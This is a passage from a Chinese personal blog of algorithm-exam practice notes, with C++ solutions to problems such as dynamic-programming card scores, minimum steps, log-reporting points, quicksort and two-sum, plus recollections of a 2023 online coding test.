m+=a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">   /*</span><br><span class="line">   1 2 3 1 </span><br><span class="line">   4</span><br><span class="line">   */</span><br><span class="line">   cout&lt;&lt;pingfen(a,m);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="玩牌获取最高分"><a href="#玩牌获取最高分" class="headerlink" title="玩牌获取最高分"></a>玩牌获取最高分</h2><p>1.抽取某张牌后，获得对应分数</p>
<p>2.如果不抽牌，其分数为3轮前的总分数；如果当前是第一轮，第二轮或第三轮，总分数置0</p>
<p>输入描述</p>
<p>第一行为n轮的牌面分数</p>
<p>分数值为整数</p>
<p>输出描述</p>
<p>最终选手<strong>最高</strong>总分数</p>
<blockquote>
<p>输入1 -5 -6 4 3 6 -2</p>
<p>输出11</p>
</blockquote>
<p>1.一旦不抽牌，为<strong>3轮前的总分数</strong>，不满3轮不抽牌，则置0</p>
<p>2.所以即使可能遇到负数也要加和，保持最高分</p>
<p>PS:噢，n轮啊，前3轮已经说明了，1，-5，-6 不用另找变量累积了，误以为当某轮结束后，新的轮数从1开始</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;sstream&gt;</span><br><span class="line">#include&lt;vector&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line">int zongfen(vector&lt;int&gt; s)</span><br><span class="line">&#123;</span><br><span class="line">    int n=s.size();</span><br><span class="line">    vector&lt;int&gt; dp(n+1,0);//i轮时的最高分dp[i]</span><br><span class="line">    dp[1]=max(0,s[0]);</span><br><span class="line">    int count=0,co=0;</span><br><span class="line">    for(int i=2;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        //当前轮选牌后的分数</span><br><span class="line">        count=dp[i-1]+s[i-1];</span><br><span class="line">      //  cout&lt;&lt;count&lt;&lt;endl;</span><br><span class="line">        if(i-1&lt;3)//前3轮  2-1=1是第二轮 3-1=2是第三轮</span><br><span class="line">        &#123;</span><br><span class="line">            dp[i]=max(count,0);</span><br><span class="line">        &#125;</span><br><span class="line">        else //从第4轮开始</span><br><span class="line">        &#123;</span><br><span class="line">            dp[i]=max(count,dp[i-3]);</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;dp[i-1]&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    return dp[n];</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">    </span><br><span class="line">    vector&lt;int&gt; v;</span><br><span class="line">    string s,t;</span><br><span class="line">    //cin&gt;&gt;s; //cin遇到空格也会结束</span><br><span class="line">    getline(cin,s);</span><br><span class="line">    stringstream ss(s);</span><br><span class="line">    while(getline(ss,t,&#x27; &#x27;))</span><br><span class="line">    &#123;</span><br><span class="line">        v.push_back(stoi(t));</span><br><span class="line">    &#125;</span><br><span class="line">   cout&lt;&lt;zongfen(v);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="最小步数"><a href="#最小步数" class="headerlink" title="最小步数"></a>最小步数</h2><p>坐标0点到坐标点n的最小步数，一次沿横坐标只能向左或向右2步或3步</p>
<p>ps:途径坐标点可为负数</p>
<p>输入坐标点n 4</p>
<p>输出		2</p>
<p>即0-&gt;4 先右移两步，再两步</p>
<p>下面这个不对哈，有时候不要考虑那么多，走一步看一步，抓关键点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dp[0]=0;dp[1]=2;dp[2]=1;dp[3]=1;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">   for(int i=4;i&lt;=end;i++)</span><br><span class="line">   &#123;</span><br><span class="line">       //当i=4,向右两次2步</span><br><span class="line">       if(i%2==0&amp;&amp;i%3!=0)</span><br><span class="line">       &#123;</span><br><span class="line">           cout&lt;&lt;&quot;%2&quot;&lt;&lt;endl;</span><br><span class="line">           dp[i]=dp[i-2]+1;</span><br><span class="line">       &#125;</span><br><span class="line">    </span><br><span class="line">       //当i=9，dp[5]+1，即一次三步</span><br><span class="line">       else if(i%2!=0&amp;&amp;i%3==0)</span><br><span class="line">       &#123;</span><br><span class="line">           cout&lt;&lt;&quot;%3&quot;&lt;&lt;endl;</span><br><span class="line">            dp[i]=dp[i-3]+1;</span><br><span class="line">       &#125;</span><br><span class="line">      //当i=6;</span><br><span class="line">       else if(i%2==0&amp;&amp;i%3==0)</span><br><span class="line">       &#123;</span><br><span class="line">           cout&lt;&lt;&quot;%2 and %3&quot;&lt;&lt;endl;</span><br><span class="line">           dp[i]=min(dp[i-2]+1,dp[i-3]+1);</span><br><span class="line">       &#125;</span><br><span class="line">      // 当i=7 是4了，但正确为3</span><br><span class="line">       else if(i%2!=0&amp;&amp;i%3!=0)</span><br><span class="line">       &#123;</span><br><span class="line">           dp[i]=dp[i-2]+dp[i-3];</span><br><span class="line">       &#125;</span><br><span class="line">       cout&lt;&lt;&quot;dp[&quot;&lt;&lt;i&lt;&lt;&quot;] &quot;&lt;&lt;dp[i]&lt;&lt;endl;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>用的3越多，步数就越小</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int bushu(int end)</span><br><span class="line">&#123;</span><br><span class="line">    end=abs(end);</span><br><span class="line">    int dp[end+1];//当前坐标i时，从0到i需要移动的最小步数</span><br><span class="line">    if(end==1) return 2;</span><br><span class="line">    else if(end==2||end==3) return 1;</span><br><span class="line"></span><br><span class="line">    dp[0]=0;dp[1]=2;dp[2]=1;dp[3]=1;</span><br><span class="line"></span><br><span class="line">    //用的3越多，步数越小</span><br><span class="line">    for(int i=4;i&lt;=end;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        dp[i]=dp[i-3]+1;</span><br><span class="line">        dp[i]=min(dp[i-2]+1,dp[i]);</span><br><span class="line">        //dp[i]=min()</span><br><span class="line">        cout&lt;&lt;&quot;dp[i]&quot;&lt;&lt;&quot;,&quot;&lt;&lt;i&lt;&lt;&quot;: &quot;&lt;&lt;dp[i]&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    return dp[end];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="最大可靠性-暴力破解"><a href="#最大可靠性-暴力破解" class="headerlink" title="最大可靠性(暴力破解)"></a>最大可靠性(暴力破解)</h2><p>一个设备N种类型元器件组成(每种类型元器件只要1个，类型编号0~N-1)，每个元器件均有可靠性属性reliability</p>
<p>可靠性越高的器件其价格price越贵</p>
<p>而设备可靠性由组成设备的所有器件中可靠性最低的器件决定</p>
<p>给定预算S，买N种器件(每种类型都要一个)，不超过预算的情况下，给出能够组成的设备最大可靠性</p>
<p>输入:</p>
<p>500 3&#x2F;&#x2F;预算和需要种类数</p>
<p>6 &#x2F;&#x2F;元器件总数</p>
<p>0 80 100</p>
<p>0 90 200</p>
<p>1 50 50</p>
<p>1 70 210</p>
<p>2 50 100</p>
<p>2 60 150</p>
<p>输出</p>
<p>60 &#x2F;&#x2F;符合的最大可靠性  </p>
<p>说明:0的80,1的70,2的60；短板效应，所以是60</p>
<p>暴力枚举，三for()</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct qijian&#123;</span><br><span class="line">    int id;</span><br><span class="line">    int rely;</span><br><span class="line">    int price;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    </span><br><span class="line">    int num,n;</span><br><span class="line">    cin&gt;&gt;num&gt;&gt;n;</span><br><span class="line"></span><br><span class="line">    int m;</span><br><span class="line">    cin&gt;&gt;m;</span><br><span class="line"></span><br><span class="line">    vector&lt;qijian&gt; v;</span><br><span class="line">    for(int i=0;i&lt;m;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        qijian a;</span><br><span class="line">        cin&gt;&gt;a.id&gt;&gt;a.rely&gt;&gt;a.price;</span><br><span class="line"></span><br><span class="line">        v.push_back(a);</span><br><span class="line">    &#125;</span><br><span class="line">    int result=0;</span><br><span class="line">    for(int i=0;i&lt;m;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        for(int j=i+1;j&lt;m;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            for(int k=j+1;k&lt;m;k++)</span><br><span class="line">            &#123;</span><br><span class="line">                if(v[i].price+v[j].price+v[k].price&lt;=num&amp;&amp;(v[i].id!=v[j].id)&amp;&amp;(v[i].id!=v[k].id))</span><br><span class="line">                &#123;</span><br><span class="line">                    int tem=min(v[i].rely,v[j].rely);</span><br><span class="line">                    tem=min(tem,v[k].rely);</span><br><span class="line"></span><br><span class="line">                    result=max(result,tem);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;result;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>500 3<br>6<br>0 80 100<br>0 90 200<br>1 50 50<br>1 70 210<br>2 50 100<br>2 60 150</p>
<p>输出：60</p>
</blockquote>
<h2 id="日志首次上报最多积分-读题是难点，双for"><a href="#日志首次上报最多积分-读题是难点，双for" class="headerlink" title="日志首次上报最多积分(读题是难点，双for)"></a>日志首次上报最多积分(读题是难点，双for)</h2><p>每成功上报一条日志，奖励1分；</p>
<p>每条日志每延迟上报1s，扣1分；</p>
<p>积累日志达到100条，必须立即上报</p>
<p>给出日志序列，根据以上规则，计算首次上报能获得的最多积分数</p>
<p>输入：</p>
<p>按时序产生的日志条数T1,T2…Tn</p>
<p>输出：</p>
<p>首次上报最多能获得的积分数</p>
<blockquote>
<p>input:1 98 1</p>
<p>output:98</p>
</blockquote>
<p>说明：</p>
<blockquote>
<p>input:3 7 40 10 60</p>
<p>output:37</p>
</blockquote>
<p>说明：</p>
<p><strong>它每一次的上报是累积的结果</strong>，首次上报的意思是，随时都可以上报，那些由于延迟而扣的分，是因为它们之前没有在正确的时刻上报过，所以要统计出到当前的日志总条数，再按延迟减</p>
<p>T1上报，当前3条，+3分</p>
<p>T2上报，当前7条，前1s上报3条，共10条，但T1延迟了1s，-3，故10-3&#x3D;7分</p>
<p>T3上报，当前40条，前2s上报10跳，共50条，但是T2延迟了1s，-7，T1延迟了2s，-2*3</p>
<p>故50-1*7-2*3&#x3D;37分</p>
<p>T4上报，当前10条，前3s上报了50条，共60条；但T3延迟1s，-40；T2延迟了2s，-2*7&#x3D;-14；T1延迟了3s，-3*3&#x3D;-9；共60-40-14-9&#x3D;-3分</p>
<p>T5上报，当前60，前4s上报了3+7+40+10&#x3D;60，共120条；</p>
<p>超过100条了，所以按上报100条起，T4延迟了1s，-10；T3延迟了2s，-2*40&#x3D;-80,；T2延迟了3s，-3*7&#x3D;-21；T1延迟了4s，-4*3&#x3D;12</p>
<p>故100-10-80-21-12&#x3D;-23</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;sstream&gt;</span><br><span class="line">#include&lt;vector&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line">int shangbao(vector&lt;int&gt; a)</span><br><span class="line">&#123;</span><br><span class="line">    int n=a.size();</span><br><span class="line">    //int dp[n+1];//上第i时刻上报日志条数，首次上报最多的积分数</span><br><span class="line"></span><br><span class="line">    int res=0;</span><br><span class="line">    //dp[0]=0;</span><br><span class="line"></span><br><span class="line">    for(int i=0;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">       int result=a[i],co=0;//上报总日志数、待扣除的积分</span><br><span class="line">       for(int j=0;j&lt;i;j++)</span><br><span class="line">       &#123;</span><br><span class="line">            result+=a[j];//累加上报值</span><br><span class="line">            co+=(i-j)*a[j];//延迟*对应条数</span><br><span class="line">       &#125;</span><br><span class="line">       </span><br><span class="line">       if(result&gt;100) result=100;</span><br><span class="line">       </span><br><span class="line">       result-=co;</span><br><span class="line">       res=max(res,result);</span><br><span class="line">    &#125;</span><br><span class="line">    return res;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">    </span><br><span class="line">    vector&lt;int&gt; v;</span><br><span class="line">    string s,t;</span><br><span class="line">    getline(cin,s);//以\n结束</span><br><span class="line">    stringstream ss(s);</span><br><span class="line">    while(getline(ss,t,&#x27; &#x27;))</span><br><span class="line">    &#123;</span><br><span class="line">        v.push_back(stoi(t));</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;shangbao(v);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="积木最远距离"><a href="#积木最远距离" class="headerlink" title="积木最远距离"></a>积木最远距离</h2><p>小华和小微一起通过玩积木游戏学习数学。</p>
<p> 他们有很多积木，每个积木块上都有一个数字，积木块上的数字可能相同。 小华随机拿一些积木挨着排成一排，请小微找到这排积木中数字相同且所处位置最远的2块积木块，计算他们的距离， 小微请你帮忙替她解决这个问题。 </p>
<p>输入描述 第一行输入为N，表示小华排成一排的积木上数字</p>
<p>输出描述 相同数字的积木的位置最远距离；</p>
<p>如果所有积木数字都不相同，请返回-1. </p>
<p>备注： 0 &lt;&#x3D; 积木上的数字 &lt;&#x3D; 10^9 1 &lt;&#x3D; 积木长度 &lt;&#x3D; 10^5</p>
<p>示例1 输入输出示例仅供调试，后台判题数据一般不包含示例</p>
<p> 输入 5 </p>
<p>​		1 2 3 1 4 </p>
<p>输出 3 </p>
<p>说明： 共有5个积木，第1个积木和第4个积木数字相同，其距离为3. </p>
<p>示例2 输入输出示例仅供调试，后台判题数据一般不包含示例 </p>
<p>输入 2 	</p>
<p>​		1 2 </p>
<p>输出 -1 </p>
<p>说明 一共有2个积木，没有积木数字相同，返回-1.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">int juli(vector&lt;int&gt; a)</span><br><span class="line">&#123;</span><br><span class="line">    int n=a.size();</span><br><span class="line"></span><br><span class="line">    //两块相同数字的最远距离</span><br><span class="line">    int res=-1;</span><br><span class="line">    for(int i=0;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        int pre=a[i];</span><br><span class="line">        for(int j=i+1;j&lt;n;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            if(pre==a[j]) res=max(res,j-i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return res;</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">    int n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    vector&lt;int&gt; a(n);</span><br><span class="line">    for(int i=0;i&lt;n;i++)</span><br><span class="line">    cin&gt;&gt;a[i];</span><br><span class="line"></span><br><span class="line">    cout&lt;&lt;juli(a);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>时间复杂度上的优化，使用unordered_map</p>
<p>映射表中的键值，查找时的时间复杂度O(1)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int juli(vector&lt;int&gt; a)</span><br><span class="line">&#123;</span><br><span class="line">    unordered_map&lt;int,int&gt; mp;//键为数字大小，值为索引</span><br><span class="line">    int res=-1;</span><br><span class="line">    for(int i=0;i&lt;a.size();i++)</span><br><span class="line">    &#123;</span><br><span class="line">        auto iter=mp.find(a[i]);//哈希表中查找该键</span><br><span class="line">        if(iter==mp.end())//没找到</span><br><span class="line">        &#123;</span><br><span class="line">            mp.insert(make_pair(a[i],i));//存进去</span><br><span class="line">        &#125;</span><br><span class="line">        else//找到了</span><br><span class="line">        &#123;</span><br><span class="line">            if(i-iter-&gt;second&gt;res) //距离是否更大</span><br><span class="line">            res=i-iter-&gt;second;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><h1 id="补充知识点"><a href="#补充知识点" class="headerlink" title="补充知识点"></a>补充知识点</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">replace(a.begin(),a.end(),&#x27;a&#x27;,&#x27;s&#x27;); //替换指定字符</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Check&#123; </span><br><span class="line">	int x;</span><br><span class="line">	int y;</span><br><span class="line">// 定义 operator== 成员函数</span><br><span class="line">    bool operator==(const Check&amp; other) const &#123;</span><br><span class="line">        return x == other.x &amp;&amp; y == other.y;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">        bool operator&gt;(const Check&amp; other) const &#123;</span><br><span class="line">        // 比较 x 和 y，根据自定义的逻辑返回结果</span><br><span class="line">        // 例如，这里我们假设只要 x 和 y 的和大于对方的和，就认为当前对象大于对方对象</span><br><span class="line">        return (x + y) &gt; (other.x + other.y);</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;;</span><br></pre></td></tr></table></figure>

<p>快排</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void quicksort(vector&lt;int&gt;&amp; a,int left,int right)</span><br><span class="line">&#123;</span><br><span class="line">    if(left&gt;=right) return;</span><br><span class="line"></span><br><span class="line">    int first=left;</span><br><span class="line">    int last=right;</span><br><span class="line">    int key=a[first];</span><br><span class="line">    while(first&lt;last)</span><br><span class="line">    &#123;</span><br><span class="line">        while(first&lt;last&amp;&amp;a[last]&gt;key) last--;</span><br><span class="line">        if(first&lt;last) a[first++]=a[last];</span><br><span class="line"></span><br><span class="line">        while(first&lt;last&amp;&amp;a[first]&lt;=key) first++;</span><br><span class="line">        if(first&lt;last) a[last--]=a[first];</span><br><span class="line"></span><br><span class="line">        a[first]=key;</span><br><span class="line">        quicksort(a,left,first-1);</span><br><span class="line">        quicksort(a,first+1,right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">    vector&lt;int&gt; a=&#123;1,8,9,5,3,2,7&#125;;</span><br><span class="line">    quicksort(a,0,a.size()-1);</span><br><span class="line">    for (auto aa:a)</span><br><span class="line">    cout&lt;&lt;aa&lt;&lt;&quot; &quot;;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="两数之和最优解"><a href="#两数之和最优解" class="headerlink" title="两数之和最优解"></a>两数之和最优解</h3><p>给数组nums，有目标target，找到和为target的两个整数的下标</p>
<p>利用unorder</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;vector&gt;</span><br><span class="line">#include&lt;map&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">map&lt;int,int&gt; numtoindex;</span><br><span class="line">vector&lt;int&gt; ss(vector&lt;int&gt; a,int t)</span><br><span class="line">&#123;</span><br><span class="line">   for(int i=0;i&lt;a.size();i++)</span><br><span class="line">   &#123;</span><br><span class="line">        int num=t-a[i];</span><br><span class="line">        if(numtoindex.find(num)!=numtoindex.end())</span><br><span class="line">        &#123;</span><br><span class="line">            return &#123;numtoindex[num],i&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        numtoindex[a[i]]=i;</span><br><span class="line">   &#125;</span><br><span class="line">   return &#123;&#125;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">    vector&lt;int&gt; a=&#123;1,8,9,5,3,2,7&#125;;</span><br><span class="line">    int t=7;</span><br><span class="line">    vector&lt;int&gt; res=ss(a,t);</span><br><span class="line">    if(res.size()!=0) cout&lt;&lt;res[0]&lt;&lt;&quot;,&quot;&lt;&lt;res[1];</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>3,5</p>
</blockquote>
<h1 id="20230802"><a href="#20230802" class="headerlink" title="20230802"></a>20230802</h1><h3 id="第一题-100"><a href="#第一题-100" class="headerlink" title="第一题 100%"></a>第一题 100%</h3><p>就是找宝藏，有n个箱子，删除k个i编号的箱子，使得剩下的箱子个数小于等于原个数的一半</p>
<p> 1 1 1 1 3 3 3 6 6 8  10个箱子，1号箱子4个，3号3个，6号2个，8号1个</p>
<p>我用的map，统计i号箱子，及其个数</p>
<p>按个数从大到小排</p>
<p>初始化result&#x3D;n</p>
<p>遍历mp:map</p>
<p>num&#x3D;num-mp.second</p>
<p>co++&#x2F;&#x2F;统计箱子个数</p>
<p>如果满足 num&lt;&#x3D;n&#x2F;2 break;</p>
<h3 id="第二题-40"><a href="#第二题-40" class="headerlink" title="第二题 40%"></a>第二题 40%</h3><p>哎，这个题，待检测目录的大小统计</p>
<p>给目录行数n，待检测目录ID</p>
<p>n行目录，格式为 目录ID(1~200)，目录大小 (子目录)</p>
<p>如</p>
<blockquote>
<p>3 2</p>
<p>3 20 ()</p>
<p>2 15 (1)</p>
<p>1 20 (3)</p>
<p>输出</p>
<p>55</p>
</blockquote>
<p>这个倒是小问题</p>
<p>主要是</p>
<blockquote>
<p>4 2</p>
<p>3 20 ()</p>
<p>2 15 (1,4)</p>
<p>1 20 (3)</p>
<p>4 15 ()</p>
<p>输出</p>
<p>15+20+20+15&#x3D;70</p>
</blockquote>
<p>有逗号了</p>
<p>记不清了</p>
<p>当时想的是递归，但是存储的时候就有问题，我塔喵用vector&lt;string&gt; s，没错，就是把前面的值当做下标i，比如，s[1]&#x3D;”20 (3)”，塔喵的</p>
<p>做第三题的时候才想到struct，应该用struct的</p>
<p>int id</p>
<p>int size</p>
<p>vector&lt;int&gt; next;</p>
<p>这样存储看着也好点吧</p>
<h4 id="完善代码"><a href="#完善代码" class="headerlink" title="完善代码"></a>完善代码</h4><p>思想</p>
<blockquote>
<p>1.struct起存储作用</p>
<p>2.map建立映射关系，目录与大小的映射mp1；父目录与子目录的映射mp2</p>
<p>3.递归遍历子目录、子目录的子目录、子目录的子目录的子目录。。。</p>
<p>4.相加的话，直接加mp1[id]就可以了</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;vector&gt;</span><br><span class="line">#include&lt;algorithm&gt;</span><br><span class="line">#include&lt;sstream&gt;</span><br><span class="line">#include&lt;map&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">struct mulu&#123;</span><br><span class="line">    int id;</span><br><span class="line">    int size;</span><br><span class="line">    vector&lt;int&gt; nextid;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">map&lt;int,int &gt;mp1;//来个映射，目录与大小映射</span><br><span class="line">map&lt;int,vector&lt;int&gt; &gt;mp2;//目录与子目录映射</span><br><span class="line">void yingshe(vector&lt;mulu&gt; a)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    //目录与大小</span><br><span class="line">    for(auto tem:a)</span><br><span class="line">    &#123;</span><br><span class="line">        mp1[tem.id]=tem.size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //目录与子目录</span><br><span class="line">      for(auto tem:a)</span><br><span class="line">    &#123;</span><br><span class="line">        for(int i=0;i&lt;tem.nextid.size();i++)</span><br><span class="line">        &#123;</span><br><span class="line">            mp2[tem.id].push_back(tem.nextid[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int jisuan(map&lt;int,int&gt; mp1,map&lt;int,vector&lt;int&gt; &gt;mp2,int n)</span><br><span class="line">&#123;</span><br><span class="line">    int result=0;</span><br><span class="line">    for(auto dir:mp2)//目录与子目录</span><br><span class="line">    &#123;   </span><br><span class="line">        if(dir.first==n)//先将父目录的大小加上来</span><br><span class="line">        &#123;</span><br><span class="line">            result+=mp1[n];</span><br><span class="line">        for(auto dir1:dir.second)//遍历它的子目录</span><br><span class="line">        &#123;</span><br><span class="line">            //n=dir1;</span><br><span class="line">            //result+=jisuan(mp1,mp2,n);//这样不对，应该是要把参数改为&amp;n，所以用下面的吧</span><br><span class="line">            result+=jisuan(mp1,mp2,dir1);//递归子目录的子目录</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">     </span><br><span class="line">    &#125;</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">    /*</span><br><span class="line">    3 2</span><br><span class="line"></span><br><span class="line">3 20 ()</span><br><span class="line"></span><br><span class="line">2 15 (1)</span><br><span class="line"></span><br><span class="line">1 20 (3)</span><br><span class="line">    */</span><br><span class="line">   int m,n;</span><br><span class="line">   cin&gt;&gt;m&gt;&gt;n;</span><br><span class="line">    vector&lt;mulu&gt; dir;</span><br><span class="line">   for(int i=0;i&lt;m;i++)</span><br><span class="line">   &#123;</span><br><span class="line">        string t;</span><br><span class="line">        mulu a;</span><br><span class="line">        cin&gt;&gt;a.id&gt;&gt;a.size;</span><br><span class="line">        cin&gt;&gt;t;</span><br><span class="line">        t=t.substr(1,t.size()-2);</span><br><span class="line">        cout&lt;&lt;&quot;now the t is&quot;&lt;&lt;t&lt;&lt;endl;</span><br><span class="line">        if(t.size()==0) a.nextid.push_back(0);//没有值</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            if(!count(t.begin(),t.end(),&#x27;,&#x27;))//只有一个值</span><br><span class="line">                a.nextid.push_back(stoi(t));</span><br><span class="line">            else   //有多个子目录</span><br><span class="line">            &#123;</span><br><span class="line">                stringstream ss(t);</span><br><span class="line">                string s;</span><br><span class="line">                while(getline(ss,s,&#x27;,&#x27;))</span><br><span class="line">                 a.nextid.push_back(stoi(s));</span><br><span class="line">            &#125;</span><br><span class="line">            // string shuzi=&quot;&quot;;</span><br><span class="line">            // for(int k=0;k&lt;t.size();k++)</span><br><span class="line">            // &#123;</span><br><span class="line">            //     if(isdigit(t[k]))</span><br><span class="line">            //     shuzi+=t[k];</span><br><span class="line">            //     else if(k==t.size()-1)//末尾</span><br><span class="line">            //     &#123;</span><br><span class="line">            //         a.nextid.push_back(stoi(shuzi));</span><br><span class="line">            //     &#125;</span><br><span class="line">            //     else if(t[k]==&#x27;,&#x27;)</span><br><span class="line">            //     &#123;</span><br><span class="line">            //         cout&lt;&lt;shuzi&lt;&lt;endl;</span><br><span class="line">            //         a.nextid.push_back(stoi(shuzi));</span><br><span class="line">            //         shuzi=&quot;&quot;;</span><br><span class="line">            //     &#125;</span><br><span class="line"></span><br><span class="line">            // &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        dir.push_back(a);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">    yingshe(dir);</span><br><span class="line"></span><br><span class="line">//    for(auto tem:dir)</span><br><span class="line">//    &#123;</span><br><span class="line">//     cout&lt;&lt;tem.id&lt;&lt;&quot;,&quot;&lt;&lt;tem.size&lt;&lt;&quot;,&quot;;</span><br><span class="line">//     for(auto tem1:tem.nextid)</span><br><span class="line">//     &#123;</span><br><span class="line">//         cout&lt;&lt;tem1&lt;&lt;&quot;,&quot;;</span><br><span class="line">//     &#125;</span><br><span class="line">//     cout&lt;&lt;endl;</span><br><span class="line">//    &#125;</span><br><span class="line">cout&lt;&lt;jisuan(mp1,mp2,n);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="第三题-60"><a href="#第三题-60" class="headerlink" title="第三题 60%"></a>第三题 60%</h3><p>这个题，哎，一开始没看懂题，花了不少时间，虽然最后可能看懂了，但没时间了</p>
<p>它是这样的，分销公司自己的钱+下级公司上交的钱（开始这里就没注意），如果满100，上交给它的上级公司15，不够100就算了</p>
<p>比如 199	还是15</p>
<p>​		200	就是30</p>
<p>注意的是，最终的钱上交给唯一一个公司，称为boss。</p>
<p>且输入不会有回路</p>
<p>输入格式</p>
<p>第一行 行数n</p>
<p>第二行起的n行，格式为分销公司Id 上级公司id 钱</p>
<p>如</p>
<blockquote>
<p>5</p>
<p>1 0 100</p>
<p>2 0 199</p>
<p>3 0 200</p>
<p>4 0 200</p>
<p>5 0 200</p>
<p>输出boss 15+15+30+30+30</p>
</blockquote>
<p>这题我觉得有两个关键点</p>
<p>1是找boss</p>
<p>2是子公司上交的钱</p>
<p>先找出boss</p>
<p>比如</p>
<blockquote>
<p>5</p>
<p>1 4 200</p>
<p>2 4 200</p>
<p>3 4 200</p>
<p>4 0 200</p>
<p>5 0 200</p>
</blockquote>
<p>我的中间阶段的想法是：</p>
<p>上面这三个我用了struct boss啊，int no, int boss, int money</p>
<p>先用vector&lt;boss&gt; a接收了值</p>
<p>先找boss:</p>
<p>这里又引入一个map&lt;int,vector&lt;int&gt; &gt;mp 存储映射关系 键为可能的boss,值为其子公司</p>
<p>上面的例子存储结果为:</p>
<p>0 4,5</p>
<p>4 1,2,3</p>
<p>我到了中期阶段才想到，如果是真正的boss，它是不会出现在值里的</p>
<p>那我引入了一个vector&lt;int&gt; head，存储键，内容为(0,4)</p>
